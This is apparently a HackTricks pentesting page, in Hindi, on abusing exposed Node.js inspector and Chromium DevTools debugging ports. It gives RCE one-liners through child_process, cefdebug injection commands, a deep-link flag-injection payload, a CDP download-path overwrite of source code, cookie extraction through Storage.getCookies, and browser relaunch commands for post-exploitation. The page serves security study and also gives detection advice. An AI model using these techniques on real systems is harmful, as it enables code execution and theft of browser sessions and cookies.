# Node inspector/CEF debug abuse

{{#include ../../banners/hacktricks-training.md}}

ऐतिहासिक practical examples में Multimaster walkthrough और CVE-2019-1414 Visual Studio Code debugger attack शामिल हैं; इन्हें version-specific context के रूप में उपयोग करें, न कि यह मानें कि हर वर्तमान Electron या Chromium target में समान primitives उपलब्ध हैं।<sup>[[1]](#references)[[3]](#references)</sup>

## बुनियादी जानकारी

[Docs से](https://nodejs.org/learn/getting-started/debugging): `--inspect` switch के साथ शुरू किए जाने पर, Node.js process debugging client के लिए listen करता है। **Default** रूप से, यह host और port **`127.0.0.1:9229`** पर listen करेगा। प्रत्येक process को एक **unique** **UUID** भी दिया जाता है।<sup>[[4]](#references)</sup>

Connect करने के लिए Inspector clients को host address, port और UUID का पता होना और उन्हें specify करना आवश्यक है। पूरा URL कुछ इस प्रकार दिखाई देगा: `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e`।<sup>[[4]](#references)</sup>

> [!WARNING]
> चूंकि **debugger को Node.js execution environment तक full access प्राप्त है**, इसलिए इस port से connect करने में सक्षम malicious actor, Node.js process की ओर से arbitrary code execute कर सकता है (**potential privilege escalation**)।<sup>[[4]](#references)</sup>

Inspector शुरू करने के कई तरीके हैं:<sup>[[4]](#references)</sup>
```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```
जब आप किसी inspected process को शुरू करते हैं, तो कुछ इस तरह दिखाई देगा:<sup>[[4]](#references)</sup>
```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```
**CEF** (**Chromium Embedded Framework**) पर आधारित processes `--remote-debugging-port=9222` के साथ एक debugger expose कर सकते हैं। यह browser को Node.js inspector के बजाय [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) के माध्यम से expose करता है, इसलिए Node.js `process`-based payloads डिफ़ॉल्ट रूप से सीधे लागू नहीं होते।<sup>[[2]](#references)[[5]](#references)</sup>

जब आप debug किए गए browser को start करते हैं, तो कुछ ऐसा दिखाई देगा:<sup>[[2]](#references)[[5]](#references)</sup>
```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```
### CDP endpoint की Enumeration और driving

HTTP discovery endpoints **browser** WebSocket को individual **target** (tab, worker, extension, आदि) WebSockets से अलग करते हैं। Browser endpoint के लिए `/json/version` और targets के लिए `/json/list` को query करें; इसके बाद लौटाए गए `webSocketDebuggerUrl` values को CDP के JSON-RPC-जैसे messages के साथ सीधे drive किया जा सकता है।<sup>[[5]](#references)</sup>
```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```
उदाहरण के लिए, `websocat "$BROWSER_WS"` से connect करें और `{"id":1,"method":"Target.getTargets"}` या `{"id":2,"method":"Storage.getCookies"}` भेजें। किसी page target (`websocat "$PAGE_WS"`) पर, `Runtime.evaluate` उस renderer में execute होता है और `Page.captureScreenshot` base64-encoded screenshot लौटाता है। `document.cookie` `HttpOnly` cookies को reveal नहीं कर सकता, जबकि `Storage.getCookies` browser से उसके cookie store के बारे में पूछता है।<sup>[[5]](#references)</sup>
```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```
### ब्राउज़र, WebSockets और same-origin policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

वेब-ब्राउज़र में खुली वेबसाइटें ब्राउज़र security model के अंतर्गत WebSocket और HTTP requests कर सकती हैं। **एक प्रारंभिक HTTP connection** **unique debugger session id प्राप्त करने** के लिए आवश्यक है। **same-origin-policy** वेबसाइटों को **यह HTTP connection बनाने** से **रोकती है**। [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)** के विरुद्ध अतिरिक्त security के लिए, Node.js यह verify करता है कि connection के **'Host' headers** में या तो **IP address** या ठीक-ठीक **`localhost`** निर्दिष्ट हो।<sup>[[4]](#references)</sup>

> [!TIP]
> यह **security measure inspector का exploit करके** **सिर्फ HTTP request भेजकर** code run करने से रोकता है (जो SSRF vuln का exploit करके किया जा सकता है)।<sup>[[4]](#references)</sup>

### Running processes में inspector शुरू करना

आप किसी running nodejs process को **signal SIGUSR1** भेजकर उसे default port पर **inspector शुरू** करने के लिए कह सकते हैं। हालांकि, ध्यान दें कि आपके पास पर्याप्त privileges होना आवश्यक है, इसलिए इससे आपको **process के अंदर की information तक privileged access** मिल सकता है, लेकिन direct privilege escalation नहीं।<sup>[[4]](#references)</sup>
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
> [!TIP]
> यह containers में उपयोगी है क्योंकि `--inspect` के साथ **process को बंद करके नया process शुरू करना** **विकल्प नहीं है**, क्योंकि **container** process के साथ ही **kill** हो जाएगा।<sup>[[6]](#references)</sup>

### inspector/debugger से कनेक्ट करें

**Chromium-based browser** से कनेक्ट करने के लिए Chrome या Edge में क्रमशः `chrome://inspect` या `edge://inspect` URLs access किए जा सकते हैं। Configure बटन पर क्लिक करके यह सुनिश्चित किया जाना चाहिए कि **target host और port** सही ढंग से सूचीबद्ध हैं। यह image Remote Code Execution (RCE) का उदाहरण दिखाती है:<sup>[[2]](#references)[[4]](#references)</sup>

![Debugger को access करने के लिए एक URL दिखाई देगा। उदाहरण के लिए, ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - inspector/debugger से कनेक्ट करें: Chromium-based browser से कनेक्ट करने के लिए,...](<../../images/image (674).png>)

**command line** का उपयोग करके आप debugger/inspector से कनेक्ट कर सकते हैं:<sup>[[2]](#references)[[4]](#references)</sup>
```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```
Tool [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug), स्थानीय रूप से चल रहे **inspectors** को **find** करने और उनमें **code inject** करने की अनुमति देता है।<sup>[[2]](#references)</sup>
```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```
> [!TIP]
> ध्यान दें कि [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) के माध्यम से किसी browser से **connected** होने पर **NodeJS RCE exploits** काम नहीं करेंगे (इसके साथ करने योग्य दिलचस्प चीज़ें खोजने के लिए आपको API की जाँच करनी होगी)।<sup>[[2]](#references)[[5]](#references)</sup>

## NodeJS Debugger/Inspector में RCE

> [!TIP]
> यदि आप यह जानने के लिए यहाँ आए हैं कि [**Electron में XSS से RCE कैसे प्राप्त करें, तो यह page देखें।**](../../network-services-pentesting/pentesting-web/electron-desktop-apps/index.html)

जब आप किसी Node **inspector** से **connect** कर सकते हैं, तब **RCE** प्राप्त करने के कुछ सामान्य तरीकों में इस तरह की किसी चीज़ का उपयोग करना शामिल है (ऐसा लगता है कि यह **Chrome DevTools protocol** से connection में काम नहीं करेगा):<sup>[[2]](#references)</sup>
```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```
## Chrome DevTools Protocol Payloads

आप API यहाँ देख सकते हैं: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/)।<sup>[[5]](#references)</sup>
इस section में मैं केवल उन रोचक चीज़ों की सूची दूँगा, जिनका उपयोग लोगों ने इस protocol का exploit करने के लिए किया है।

### Chrome 136+ default-profile restriction

**Chrome 136** से, जब `--remote-debugging-port` और `--remote-debugging-pipe` का target **default Chrome data directory** होता है, तो Chrome उन्हें ignore कर देता है। इस switch को एक non-standard `--user-data-dir` के साथ इस्तेमाल करना आवश्यक है। इसकी अलग encryption key और isolated browser state, user के सामान्य authenticated profile को केवल flag-based technique से expose होने से रोकती है। यह Chrome-specific restriction पुराने Chrome builds, Chrome for Testing, Electron/CEF applications या अन्य Chromium derivatives पर verification के बिना लागू मानी नहीं जानी चाहिए।<sup>[[14]](#references)</sup>
```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```
इसलिए, वर्तमान में केवल `--remote-debugging-port` के साथ लॉन्च हुई Chrome process को देखना यह **सिद्ध नहीं करता** कि CDP सक्रिय हो गया है। Listener और `/json/version` की पुष्टि करें और निर्धारित करें कि वास्तव में कौन-सा profile इसे back करता है।<sup>[[14]](#references)</sup>

### Parameter Injection via Deep Links

[**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) में Rhino security ने पाया कि CEF पर आधारित एक application ने system में एक custom UR**I (workspaces://index.html) register किया, जिसे पूरी URI प्राप्त होती थी और फिर यह CEF based applicatio**n को ऐसी configuration के साथ launch करता था, जिसका कुछ भाग उस URI से बनाया जाता था।<sup>[[8]](#references)</sup>

यह पता चला कि URI parameters को URL decoded किया जाता था और CEF basic application को launch करने के लिए उपयोग किया जाता था, जिससे user **inject** कर सकता था flag **`--gpu-launcher`** को **command line** में और arbitrary चीज़ें execute कर सकता था।<sup>[[8]](#references)</sup>

इसलिए, payload इस तरह का हो सकता है:
```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```
calc.exe execute करेगा।<sup>[[8]](#references)</sup>

### Files Overwrite करें

वह folder बदलें जहाँ **downloaded files save होने वाली हैं** और ऐसा file download करें जो application के अक्सर उपयोग किए जाने वाले **source code** को आपके **malicious code** से **overwrite** कर दे।<sup>[[5]](#references)[[6]](#references)</sup>
```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
JSON.stringify({
id: 42069,
method: "Browser.setDownloadBehavior",
params: {
behavior: "allow",
downloadPath: "/code/",
},
})
)
```
### Webdriver RCE और exfiltration

STAR Labs ने दिखाया कि exposed WebDriver/CDP services arbitrary file reads और RCE को सक्षम कर सकती हैं; कुछ configurations में DNS rebinding exploit chain को पूरा कर सकता है।<sup>[[9]](#references)</sup>

अतिरिक्त historical browser-automation और Chromium security cases के लिए, Counter WebDriver write-up और Project Zero issues 773, 1742, और 1944 देखें।<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### Live Chromium process के अंदर CDP enable करना

Windows पर, [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) ने दिखाया कि command-line restriction CDP activate करने का एकमात्र तरीका नहीं है: मौजूदा `msedge.exe` में inject करने में सक्षम code Chromium के non-exported `content::DevToolsAgentHost::StartRemoteDebuggingServer` को invoke कर सकता है और browser को restart किए बिना authenticated live profile expose कर सकता है।<sup>[[15]](#references)</sup>

Demonstrated chain `VirtualAllocEx`/`WriteProcessMemory`/`CreateRemoteThread` के साथ एक DLL inject करती है, internal Edge symbols को resolve करती है (पहले PDBs से और फिर version-specific byte signatures के साथ), browser window को subclass करती है, और एक message post करती है ताकि final server-start call browser के **UI thread** पर execute हो। Socket loopback से bind होता है, जिसके बाद सामान्य CDP primitives cookies retrieve कर सकते हैं, tabs capture कर सकते हैं, network traffic inspect कर सकते हैं, या authenticated pages में JavaScript evaluate कर सकते हैं।<sup>[[15]](#references)</sup>

> [!WARNING]
> यह एक **post-compromise/process-injection** technique है, unauthenticated network bypass नहीं। यह relevant C++ symbols के export न होने और browser updates के बाद signatures बदल सकने के कारण अत्यधिक build-dependent है।<sup>[[15]](#references)</sup>

Detection के लिए केवल `--remote-debugging-*` command-line telemetry पर निर्भर न रहें: browser processes के विरुद्ध unusual handles और memory operations (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, thread creation), DLL injection, और Chrome/Edge के स्वामित्व वाले unexpected loopback listening sockets को भी correlate करें।<sup>[[15]](#references)</sup>

### Post-Exploitation

एक real environment में और Chromium-based browser का उपयोग करने वाले user PC को **compromise करने के बाद**, एक historical technique browser को debugging enabled के साथ relaunch करना और loopback port को forward करना था। इससे उन products/builds पर victim की browsing state expose हो सकती है जो अभी भी selected profile को accept करते हैं, लेकिन Chrome 136+ अपने default data directory के विरुद्ध इसे honor नहीं करेगा।<sup>[[7]](#references)[[14]](#references)</sup>

Original relaunch command नीचे older/version-specific targets के लिए preserve की गई है। दूसरी command supported current-Chrome form है, लेकिन यह victim की सामान्य authenticated state को फिर से खोलने के बजाय एक isolated profile create करती है।<sup>[[7]](#references)[[14]](#references)</sup>
```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```
macOS-विशिष्ट Chromium relaunch, extension और CDP tradecraft के लिए, [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md) देखें।



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium debugger inspection and exploitation tool](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Chrome DevTools Debugger के माध्यम से Visual Studio Code Remote Code Execution](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js Debugging Guide - शुरुआत करना](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Browsing Sessions को remotely observe और control करने के लिए Chrome के Debugging Feature का दुरुपयोग](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [You Talking To Me? - DNS Rebinding और CDP के माध्यम से WebDriver RCE (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Bot से RCE तक](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero Issue 773 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero Issue 1742 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero Issue 1944 (Chromium bug tracker)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [security सुधारने के लिए remote debugging switches में बदलाव - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [Running Edge Browser में CDP inject करना: Runtime Browser Instrumentation का गहन विश्लेषण](https://deathflamingo.com/blog/cdp_enabler/)
{{#include ../../banners/hacktricks-training.md}}
